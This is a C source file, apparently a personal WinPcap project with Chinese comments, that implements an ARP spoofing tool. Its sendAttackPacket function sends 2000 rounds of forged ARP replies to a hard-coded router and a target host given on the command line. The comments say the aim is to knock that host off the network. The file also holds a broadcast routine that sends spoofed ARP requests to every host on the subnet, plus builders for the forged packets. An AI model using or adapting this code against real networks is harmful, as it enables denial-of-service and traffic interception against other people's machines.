#include "ArpCheater.h"

/*测试Mac地址的表示方法*/
int main1(int argc, char *argv[]) {
	unsigned char mac[6] = {0x54, 0xee, 0x75, 0xd8, 0xa0, 0x61 };
	//unsigned char* mac = (unsigned char*)&a;
	printf("发送arp欺骗包,本机(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	unsigned char receiverMac[6] = { 0 };
	memcpy(receiverMac, mac, 6);
	for (int i = 0; i < 6; i++) {
		printf("%X ", receiverMac[i]);
	}
	putchar(10);


	printf("argc=%d\n",argc);
	printf("argv[0]=%s\n", argv[0]);
	printf("argv[1]=%s\n", argv[1]);

	system("pause");
	return 0;
}


pcap_t *deviceHandler;
pcap_addr_t *pAddress; //网卡地址 
unsigned char *packet; //ARP包 
unsigned long fakeIps; //要伪装成的IP地址 
unsigned long localIp; //IP地址 
unsigned long netmask; //子网掩码
unsigned char *mac; //本机MAC地址 

int main(int argc, char *argv[]) {
	pcap_if_t *allDevices; //所有网卡
	pcap_if_t *device; //某网卡
	int deviceCount = 0; //网卡计数
	int deviceNumber = 0; //选择的指定的网卡序号

	char errorBuffer[PCAP_ERRBUF_SIZE]; //错误信息缓冲

	if (argc != 2) {
		printf("Usage:%s ip(address to cheat).\n", argv[0]);
		return -1;
	}

	/*从参数列表获取要伪装的IP地址*/
	fakeIps = inet_addr(argv[1]);
	if (INADDR_NONE == fakeIps)
	{
		fprintf(stderr, "Invalid ip address:%s\n", argv[1]);
		return -1;
	}

	/*获取所有网卡列表*/
	int findResult = pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &allDevices, errorBuffer);
	if (-1 == findResult)
	{
		fprintf(stderr, "%s\n", errorBuffer);
		exit(1);
	}

	for (device = allDevices; NULL != device; device = device->next) {
		printf("%d: %s", ++deviceCount, device->name);
		if (NULL == device->description) {
			printf("(No device available!)\n");
		}
		else
		{
			printf("(%s)\n",device->description);
		}
	}
	/*选择一张网卡进行工作*/
	printf("Enter the interface number(1 - %d):", deviceCount);
	scanf("%d", &deviceNumber);
	/*如果用户选择的网卡序号超出有效范围，则退出 */
	if (deviceNumber > deviceCount || deviceNumber < 1) {
		printf("Interface number out of range!");
		/*释放设备列表*/
		pcap_freealldevs(allDevices);
		return -1;
	}
	/*跳到指定网卡*/
	for (device = allDevices, deviceCount = 0; deviceCount < deviceNumber - 1; deviceCount++, device = device->next);
	
	/*获取本机MAC*/
	mac = getLocalMac(device->name);
	/*Debug*/
	mac[0] = 0x011;


	printf("发送arp欺骗包,本机(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)试图伪装成%s\n",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], argv[1]);

	/*打开网卡*/
	deviceHandler = pcap_open(device->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errorBuffer);

	if (NULL == deviceHandler)
	{
		fprintf(stderr, "\nUnable to open the adapter, %s is not supported by WinPcap.\n", device->name);
		pcap_freealldevs(allDevices);
		return -1;
	}

	/*获取指定设备的ip和子网掩码*/
	for (pAddress = device->addresses; NULL != pAddress; pAddress = pAddress->next) {
		localIp = ((struct sockaddr_in*)pAddress->addr)->sin_addr.s_addr;
		netmask = ((struct sockaddr_in *)pAddress->netmask)->sin_addr.s_addr;
		if(0 == localIp || 0 == netmask) {
			continue;
		}

		/*判断本机ip是否和指定ip在同一网段*/
		if ((localIp & netmask) != (fakeIps & netmask)) {
			/*如果不在一个子网，继续遍历地址列表*/
			continue;
		}
		/*获取网络主机数*/
		unsigned long hostSize = ntohl(~netmask);
		/*获取子网地址*/
		unsigned long net = localIp & netmask;
		//群发数据包
		//sendPacketToAllHost(hostSize, net);
		//指定IP发送数据包进行arp断网攻击
		sendAttackPacket();
	}

	system("pause");
	return 0;
}

/*
	指定IP发送数据包,让主机断网的步骤:
	1.模拟路由发送arp应答包到主机(源地址:路由IP+本机MAC,目标地址:被攻击主机IP+被攻击主机MAC)
	2.模拟主机发送arp应答包到路由(源地址:被攻击主机IP+本机MAC,目标地址:路由IP+路由MAC)
*/
void sendAttackPacket() {
	unsigned long IP[2] = { inet_addr("10.253.0.1"), fakeIps};
	//unsigned char Macs[2][6] = { { 0x14,0x30,0x04,0x41,0x8d,0x1b} ,{ 0x54,0xee,0x75,0xd8,0xa0,0x61 } };
	unsigned char Macs[2][6] = { { 0x14,0x30,0x04,0x41,0x8d,0x1b } ,{ 0xF0 ,0x76 ,0x1C ,0x83 ,0xCB ,0xF5 } };
	for (int  j = 0; j < 2000; j++)
	{
		for (int i = 0, j = 1; i < 2; i++, j--)
		{
			/*构造假的arp请求包,达到本机伪装成给定的ip地址的目的*/
			if (i == 0)
			{
				packet = buildArpReplyDatagram(mac, IP[i], IP[j], Macs[j]);
			}
			else {
				packet = buildArpReplyDatagram(mac, IP[i], IP[j], Macs[j]);
			}
			/*发送数据包*/
			int sendResult = pcap_sendpacket(deviceHandler, packet, 60);
			if (sendResult == -1)
			{
				fprintf(stderr, "pcap_sendpacket error.\n");
			}
			else {
				unsigned char *senderIP = (unsigned char*)&IP[i];
				unsigned char *receiverIP = (unsigned char*)&IP[j];
				if (i == 0) {
					printf("路由->主机:\n");
					printf("source ip:%d.%d.%d.%d -- source mac:%X-%X-%X-%X-%X-%X\n", 
						senderIP[0], senderIP[1], senderIP[2], senderIP[3],
						mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
					);
					printf("destination ip:%d.%d.%d.%d -- destination mac:%X-%X-%X-%X-%X-%X\n",
						receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
						Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
					);
				}
				else {
					printf("主机->路由:\n");
					printf("source ip:%d.%d.%d.%d -- source mac:%X-%X-%X-%X-%X-%X\n",
						senderIP[0], senderIP[1], senderIP[2], senderIP[3],
						mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
					);
					printf("destination ip:%d.%d.%d.%d -- destination mac:%X-%X-%X-%X-%X-%X\n",
						receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
						Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
					);
				}
			}
		}
		//Sleep(50);
	}
}

/*
	群发数据包
*/
void sendPacketToAllHost(int hostSize, unsigned long net) {
	for (int i = 0; i < hostSize; i++)
	{
		/*第i台主机的地址,网络字节顺序*/
		unsigned long destinationIp = net | htonl(i);
		/*构造假的arp请求包,达到本机伪装成给定的ip地址的目的*/
		packet = buildArpRequestDatagram(mac, fakeIps, destinationIp);
		/*发送数据包*/
		int sendResult = pcap_sendpacket(deviceHandler, packet, 60);
		if (sendResult == -1)
		{
			fprintf(stderr, "pcap_sendpacket error.\n");
		}
		else {
			unsigned char *ipFormat = NULL;
			ipFormat = (unsigned char*)&destinationIp;
			printf("%d.%d.%d.%d 发送成功!\n", ipFormat[0], ipFormat[1], ipFormat[2], ipFormat[3]);
		}
		Sleep(50);
	}
}

/*
	获取本机MAC
	@param deviceName 指定进行工作的网卡设备名称
*/
unsigned char* getLocalMac(char* deviceName) {
	//+8以去掉"rpcap://"
	deviceName = deviceName + 8;
	static u_char mac[6];
	memset(mac, 0, sizeof(mac));
	LPADAPTER adapter = PacketOpenAdapter(deviceName);
	if (NULL == adapter || (adapter->hFile) == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	PPACKET_OID_DATA oidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (NULL == oidData)
	{
		PacketCloseAdapter(adapter);
		return NULL;
	}
	/*Retrieve the adapter MAC querying the NIC driver */
	oidData->Oid = OID_802_3_CURRENT_ADDRESS;
	oidData->Length = 6;
	memset(oidData->Data, 0, 6);
	bool status = PacketRequest(adapter, FALSE, oidData);
	if (TRUE == status)
	{
		memcpy(mac, (u_char *)(oidData->Data), 6);
	}

	free(oidData);
	PacketCloseAdapter(adapter);
	return mac;
}

/*
	封装ARP协议请求包
	@param sourceMac 源MAC
	@param sourceIP 源IP
	@param destinationIP 目标IP
	@return  目标MAC
*/
unsigned char* buildArpRequestDatagram(unsigned char* sourceMac, unsigned long sourceIP, unsigned long destinationIP) {
	static ArpDatagram packet;
	/*ARP请求包目的MAC地址是广播地址:FF-FF-FF-FF-FF-FF*/
	memset(packet.ethnetFrame.destinationMac, 0xFF, 6);
	//源MAC地址
	memcpy(packet.ethnetFrame.sourceMAC, sourceMac, 6);
	//帧类型 ARP:0X806
	packet.ethnetFrame.frameType = htons(0x0806);

	//硬件类型 Ethernet是0x0001 
	packet.arpDatagram.hardwareType = htons(0x01);

	//要映射的协议地址类型 IP 0x8000
	packet.arpDatagram.protocolType = htons(0x0800);
	//硬件地址长度 MAC地址为6
	packet.arpDatagram.hardwareAddressLength = 0x06;
	//协议地址长度 IP地址为4
	packet.arpDatagram.protocolAddressLength = 0x04;
	//操作类型 ARP请求为1,应答为2
	packet.arpDatagram.operationType = htons(0x01);
	//源MAC地址
	memcpy(packet.arpDatagram.senderMac, sourceMac, 6);
	//源IP地址
	packet.arpDatagram.senderIP = sourceIP;
	//目标MAC地址,请求包中目标MAC未知,填充0即可
	memset(packet.arpDatagram.receiverMac, 0, 6);
	//目标IP地址
	packet.arpDatagram.receiverIP = destinationIP;
	//填充数据 18Bytes
	memset(packet.arpDatagram.padding, 0, sizeof(packet.arpDatagram.padding));

	return (unsigned char*)&packet;
}

/*
	封装ARP协议应答包
	@param sourceMac 源MAC
	@param sourceIP 源IP
	@param destinationIP 目标IP
	@return  ARP协议应答包
*/
unsigned char* buildArpReplyDatagram(unsigned char* sourceMac, unsigned long sourceIP,
	unsigned long destinationIP, unsigned char* destinationMac) {
	static ArpDatagram packet;
	/*ARP请求包目的MAC地址是广播地址:FF-FF-FF-FF-FF-FF*/
	memset(packet.ethnetFrame.destinationMac, 0xFF, 6);
	//源MAC地址
	memcpy(packet.ethnetFrame.sourceMAC, sourceMac, 6);
	//帧类型 ARP:0X806
	packet.ethnetFrame.frameType = htons(0x0806);

	//硬件类型 Ethernet是0x0001 
	packet.arpDatagram.hardwareType = htons(0x01);

	//要映射的协议地址类型 IP 0x8000
	packet.arpDatagram.protocolType = htons(0x0800);
	//硬件地址长度 MAC地址为6
	packet.arpDatagram.hardwareAddressLength = 0x06;
	//协议地址长度 IP地址为4
	packet.arpDatagram.protocolAddressLength = 0x04;
	//操作类型 ARP请求为1,应答为2
	packet.arpDatagram.operationType = htons(0x02);
	//源MAC地址
	memcpy(packet.arpDatagram.senderMac, sourceMac, 6);
	//源IP地址
	packet.arpDatagram.senderIP = sourceIP;
	//目标MAC地址
	memcpy(packet.arpDatagram.receiverMac, destinationMac, 6);
	//目标IP地址
	packet.arpDatagram.receiverIP = destinationIP;
	//填充数据 18Bytes
	memset(packet.arpDatagram.padding, 0, sizeof(packet.arpDatagram.padding));

	return (unsigned char*)&packet;
}